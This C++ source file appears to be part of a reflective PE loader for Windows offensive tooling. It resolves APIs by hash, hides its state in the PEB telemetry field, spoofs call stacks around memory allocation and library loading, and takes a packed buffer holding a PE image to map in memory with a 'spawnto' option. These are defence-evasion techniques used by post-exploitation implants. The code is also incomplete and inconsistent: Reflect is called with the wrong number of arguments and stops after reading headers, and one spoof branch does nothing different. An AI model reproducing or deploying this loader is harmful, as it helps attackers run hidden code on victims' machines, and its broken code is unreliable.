#include <General.hpp>

auto DECLFN LibLoad( CHAR* LibName ) -> UPTR {
    G_INSTANCE

    if ( ! Instance->Ctx.IsSpoof ) return (UPTR)Instance->Win32.LoadLibraryA( LibName );

    return (UPTR)Spoof::Call( Instance->Win32.LoadLibraryA, 0, (PVOID)LibName );
}

auto DECLFN AllocVm( HANDLE Handle, PVOID* Address, SIZE_T ZeroBit, SIZE_T* Size, ULONG AllocType, ULONG Protection ) -> NTSTATUS {
    G_INSTANCE

    if ( ! Instance->Ctx.IsSpoof ) { 
        return Instance->Win32.NtAllocateVirtualMemory( 
            NtCurrentProcess(), Address, ZeroBit, Size, AllocType, Protection  
        );
    } else {
        return (LONG)Spoof::Call( 
            Instance->Win32.NtAllocateVirtualMemory, 0, NtCurrentProcess(), Address, 
            (PVOID)ZeroBit, Size, (PVOID)AllocType, (PVOID)Protection 
        );        
    }
}

auto DECLFN ProtVm( HANDLE Handle, PVOID* Address, SIZE_T* Size, ULONG NewProt, ULONG* OldProt ) -> NTSTATUS {
    G_INSTANCE

    if ( ! Instance->Ctx.IsSpoof ) {
        return Instance->Win32.NtProtectVirtualMemory( NtCurrentProcess(), Address, Size, NewProt, OldProt );
    } 

    return ( Instance->Win32.NtProtectVirtualMemory( NtCurrentProcess(), Address, Size, NewProt, OldProt ) );
}

auto DECLFN FixTls(
    _In_ PVOID Base,
    _In_ IMAGE_DATA_DIRECTORY* DataDir
) -> VOID {
    if ( DataDir->Size ) {
        PIMAGE_TLS_DIRECTORY TlsDir   = (PIMAGE_TLS_DIRECTORY)( (UPTR)( Base ) + DataDir->VirtualAddress );
        PIMAGE_TLS_CALLBACK* Callback = (PIMAGE_TLS_CALLBACK*)TlsDir->AddressOfCallBacks;

        if ( Callback ) {
            for ( INT i = 0; Callback[i] != nullptr; ++i ) {
                Callback[i]( Base, DLL_PROCESS_ATTACH, nullptr );
            }
        }
    }
}

auto DECLFN FixExp(
    _In_ PVOID Base,
    _In_ IMAGE_DATA_DIRECTORY* DataDir
) -> VOID {
    G_INSTANCE

    if ( DataDir->Size ) {
        PIMAGE_RUNTIME_FUNCTION_ENTRY FncEntry = (PIMAGE_RUNTIME_FUNCTION_ENTRY)( (UPTR)( Base ) + DataDir->VirtualAddress );

        Instance->Win32.RtlAddFunctionTable( (PRUNTIME_FUNCTION)FncEntry, DataDir->Size / sizeof( IMAGE_RUNTIME_FUNCTION_ENTRY ), (UPTR)( Base ) );
    }
}

auto DECLFN FixImp(
    _In_ PVOID Base,
    _In_ IMAGE_DATA_DIRECTORY* DataDir
) -> BOOL {
    G_INSTANCE

    PIMAGE_IMPORT_DESCRIPTOR ImpDesc = (PIMAGE_IMPORT_DESCRIPTOR)( (UPTR)( Base ) + DataDir->VirtualAddress );

    for ( ; ImpDesc->Name; ImpDesc++ ) {

		PIMAGE_THUNK_DATA FirstThunk  = (PIMAGE_THUNK_DATA)( (UPTR)( Base ) + ImpDesc->FirstThunk );
		PIMAGE_THUNK_DATA OriginThunk = (PIMAGE_THUNK_DATA)( (UPTR)( Base ) + ImpDesc->OriginalFirstThunk );

		PCHAR  DllName     = (CHAR*)( (UPTR)( Base ) + ImpDesc->Name );
        PVOID  DllBase     = (PVOID)( Instance->Win32.GetModuleHandleA( DllName ) );

        PVOID  FunctionPtr = 0;
        STRING AnsiString  = { 0 };

        if ( !DllBase ) {
            DllBase = (PVOID)LibLoad( DllName );
        }

		if ( !DllBase ) {
            return FALSE;
		}

		for ( ; OriginThunk->u1.Function; FirstThunk++, OriginThunk++ ) {

			if ( IMAGE_SNAP_BY_ORDINAL( OriginThunk->u1.Ordinal ) ) {

                Instance->Win32.LdrGetProcedureAddress( 
                    (HMODULE)DllBase, NULL, IMAGE_ORDINAL( OriginThunk->u1.Ordinal ), &FunctionPtr
                );

                FirstThunk->u1.Function = (UPTR)( FunctionPtr );
				if ( !FirstThunk->u1.Function ) return FALSE;

			} else {
				PIMAGE_IMPORT_BY_NAME Hint = (PIMAGE_IMPORT_BY_NAME)( (UPTR)( Base ) + OriginThunk->u1.AddressOfData );

                {
                    AnsiString.Length        = Str::LengthA( Hint->Name );
                    AnsiString.MaximumLength = AnsiString.Length + sizeof( CHAR );
                    AnsiString.Buffer        = Hint->Name;
                }
                
				Instance->Win32.LdrGetProcedureAddress( 
                    (HMODULE)DllBase, &AnsiString, 0, &FunctionPtr 
                );
                FirstThunk->u1.Function = (UPTR)( FunctionPtr );

				if ( !FirstThunk->u1.Function ) return FALSE;
			}
		}
	}
	
	return TRUE;
}

auto DECLFN FixRel(
    _In_ PVOID Base,
    _In_ UPTR  Delta,
    _In_ IMAGE_DATA_DIRECTORY* DataDir
) -> VOID {
    PIMAGE_BASE_RELOCATION BaseReloc = (PIMAGE_BASE_RELOCATION)( (UPTR)( Base ) + DataDir->VirtualAddress );
    PIMAGE_RELOC           RelocInf  = { 0 };
    ULONG_PTR              RelocPtr  = NULL;

    while ( BaseReloc->VirtualAddress ) {
        
        RelocInf = (PIMAGE_RELOC)( BaseReloc + 1 ); 
        RelocPtr = ( (UPTR)( Base ) + BaseReloc->VirtualAddress );

        while ( (BYTE*)( RelocInf ) != (BYTE*)( BaseReloc ) + BaseReloc->SizeOfBlock ) {
            switch ( RelocInf->Type ) {
            case IMAGE_REL_TYPE:
                *(UINT64*)( RelocPtr + RelocInf->Offset ) += (ULONG_PTR)( Delta ); break;
            case IMAGE_REL_BASED_HIGHLOW:
                *(UINT32*)( RelocPtr + RelocInf->Offset ) += (DWORD)( Delta ); break;
            case IMAGE_REL_BASED_HIGH:
                *(UINT16*)( RelocPtr + RelocInf->Offset ) += HIWORD( Delta ); break;
            case IMAGE_REL_BASED_LOW:
                *(UINT16*)( RelocPtr + RelocInf->Offset ) += LOWORD( Delta ); break;
            default:
                break;
            }

            RelocInf++;
        }

        BaseReloc = (PIMAGE_BASE_RELOCATION)RelocInf;
    };

    return;
}

auto DECLFN Reflect( BYTE* Buffer, ULONG Size, BYTE* ArgBuff, ULONG ArgSize ) {
    if ( *(ULONG*)( Buffer ) != 0x5A4D ) {
        return FALSE;
    }

    IMAGE_NT_HEADERS*     Header    = (IMAGE_NT_HEADERS*)( Buffer + ( (IMAGE_DOS_HEADER*)Buffer )->e_lfanew );
    IMAGE_SECTION_HEADER* SecHeader = IMAGE_FIRST_SECTION( Header );
    IMAGE_DATA_DIRECTORY* ExportDir = &Header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    IMAGE_DATA_DIRECTORY* ImportDir = &Header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    IMAGE_DATA_DIRECTORY* ExceptDir = &Header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
    IMAGE_DATA_DIRECTORY* TlsDir    = &Header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
    IMAGE_DATA_DIRECTORY* RelocDir  = &Header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
}

EXTERN_C
auto DECLFN Entry( PVOID Parameter ) -> VOID {
    PARSER   Psr      = { 0 };
    INSTANCE Instance = { 0 };

    PVOID ArgBuffer = nullptr;

    NtCurrentPeb()->TelemetryCoverageHeader = (PTELEMETRY_COVERAGE_HEADER)&Instance;

    Instance.Start      = StartPtr();
    Instance.Size       = (UPTR)EndPtr() - (UPTR)Instance.Start;
    Instance.HeapHandle = NtCurrentPeb()->ProcessHeap;

    Parameter ? ArgBuffer = Parameter : ArgBuffer = (PVOID)( (UPTR)Instance.Start + Instance.Size );

    UPTR Ntdll    = LoadModule( HashStr( "ntdll.dll" ) );
    UPTR Kernel32 = LoadModule( HashStr( "kernel32.dll" ) );

    Instance.Win32.RtlAllocateHeap   = (decltype(Instance.Win32.RtlAllocateHeap))LoadApi(Ntdll, HashStr("RtlAllocateHeap"));
    Instance.Win32.RtlReAllocateHeap = (decltype(Instance.Win32.RtlReAllocateHeap))LoadApi(Ntdll, HashStr("RtlReAllocateHeap"));
    Instance.Win32.RtlFreeHeap       = (decltype(Instance.Win32.RtlFreeHeap))LoadApi(Ntdll, HashStr("RtlFreeHeap"));
    
    Parser::New( &Psr, ArgBuffer );

    ULONG  Length    = 0;
    BYTE*  Buffer    = Parser::Bytes( &Psr, &Length );
    CHAR*  Arguments = Parser::Str( &Psr );
    BOOL   IsSpoof   = Parser::Int32( &Psr );
    WCHAR* Spawnto   = Parser::Wstr( &Psr );

    Instance.IsSpoof = IsSpoof;

    UPTR Shell32  = LoadModule( HashStr( "shell32.dll" ) );
    if ( ! Shell32 ) LibLoad( "shell32.dll" );

    Instance.Win32.DbgPrint = (decltype(Instance.Win32.DbgPrint))LoadApi(Ntdll, HashStr("DbgPrint"));

    Instance.Win32.LoadLibraryA = (decltype(Instance.Win32.LoadLibraryA))LoadApi(Kernel32, HashStr("LoadLibraryA"));

    Instance.Win32.NtClose = (decltype(Instance.Win32.NtClose))LoadApi(Ntdll, HashStr("NtClose"));

    Instance.Win32.GetProcAddress   = (decltype(Instance.Win32.GetProcAddress))LoadApi(Kernel32, HashStr("GetProcAddress"));
    Instance.Win32.GetModuleHandleA = (decltype(Instance.Win32.GetModuleHandleA))LoadApi(Kernel32, HashStr("GetModuleHandleA"));

    Instance.Win32.NtProtectVirtualMemory = (decltype(Instance.Win32.NtProtectVirtualMemory))LoadApi(Ntdll, HashStr("NtProtectVirtualMemory"));

    Instance.Win32.CommandLineToArgvW = (decltype(Instance.Win32.CommandLineToArgvW))LoadApi(Shell32, HashStr("CommandLineToArgvW"));

    Instance.Win32.GetConsoleWindow        = (decltype(Instance.Win32.GetConsoleWindow))LoadApi(Kernel32, HashStr("GetConsoleWindow"));
    Instance.Win32.AllocConsoleWithOptions = (decltype(Instance.Win32.AllocConsoleWithOptions))LoadApi(Kernel32, HashStr("AllocConsoleWithOptions"));
    Instance.Win32.FreeConsole             = (decltype(Instance.Win32.FreeConsole))LoadApi(Kernel32, HashStr("FreeConsole"));

    Instance.Win32.CreatePipe          = (decltype(Instance.Win32.CreatePipe))LoadApi(Kernel32, HashStr("CreatePipe"));
    Instance.Win32.CreateNamedPipeA    = (decltype(Instance.Win32.CreateNamedPipeA))LoadApi(Kernel32, HashStr("CreateNamedPipeA"));
    Instance.Win32.ConnectNamedPipe    = (decltype(Instance.Win32.ConnectNamedPipe))LoadApi(Kernel32, HashStr("ConnectNamedPipe"));
    Instance.Win32.DisconnectNamedPipe = (decltype(Instance.Win32.DisconnectNamedPipe))LoadApi(Kernel32, HashStr("DisconnectNamedPipe"));
    Instance.Win32.FlushFileBuffers    = (decltype(Instance.Win32.FlushFileBuffers))LoadApi(Kernel32, HashStr("FlushFileBuffers"));
    Instance.Win32.ReadFile            = (decltype(Instance.Win32.ReadFile))LoadApi(Kernel32, HashStr("ReadFile"));
    Instance.Win32.WriteFile           = (decltype(Instance.Win32.WriteFile))LoadApi(Kernel32, HashStr("WriteFile"));
    Instance.Win32.SetStdHandle        = (decltype(Instance.Win32.SetStdHandle))LoadApi(Kernel32, HashStr("SetStdHandle"));
    Instance.Win32.GetStdHandle        = (decltype(Instance.Win32.GetStdHandle))LoadApi(Kernel32, HashStr("GetStdHandle"));

    Instance.Win32.NtGetContextThread = (decltype(Instance.Win32.NtGetContextThread))LoadApi(Ntdll, HashStr("NtGetContextThread"));
    Instance.Win32.NtContinue         = (decltype(Instance.Win32.NtContinue))LoadApi(Ntdll, HashStr("NtContinue"));
    Instance.Win32.RtlCaptureContext  = (decltype(Instance.Win32.RtlCaptureContext))LoadApi(Ntdll, HashStr("RtlCaptureContext"));

    Instance.Win32.RtlAddVectoredExceptionHandler    = (decltype(Instance.Win32.RtlAddVectoredExceptionHandler))LoadApi(Ntdll, HashStr("RtlAddVectoredExceptionHandler"));
    Instance.Win32.RtlRemoveVectoredExceptionHandler = (decltype(Instance.Win32.RtlRemoveVectoredExceptionHandler))LoadApi(Ntdll, HashStr("RtlRemoveVectoredExceptionHandler"));

    Instance.Win32.RtlInitializeCriticalSection = (decltype(Instance.Win32.RtlInitializeCriticalSection))LoadApi(Ntdll, HashStr("RtlInitializeCriticalSection"));
    Instance.Win32.RtlEnterCriticalSection = (decltype(Instance.Win32.RtlEnterCriticalSection))LoadApi(Ntdll, HashStr("RtlEnterCriticalSection"));
    Instance.Win32.RtlLeaveCriticalSection = (decltype(Instance.Win32.RtlLeaveCriticalSection))LoadApi(Ntdll, HashStr("RtlLeaveCriticalSection"));

    Instance.Win32.RtlLookupFunctionEntry = (decltype(Instance.Win32.RtlLookupFunctionEntry))LoadApi(Ntdll, HashStr("RtlLookupFunctionEntry"));
    Instance.Win32.RtlUserThreadStart     = (decltype(Instance.Win32.RtlUserThreadStart))LoadApi(Ntdll, HashStr("RtlUserThreadStart"));
    Instance.Win32.BaseThreadInitThunk    = (decltype(Instance.Win32.BaseThreadInitThunk))LoadApi(Kernel32, HashStr("BaseThreadInitThunk"));

    Reflect( Buffer, Length, Arguments );
}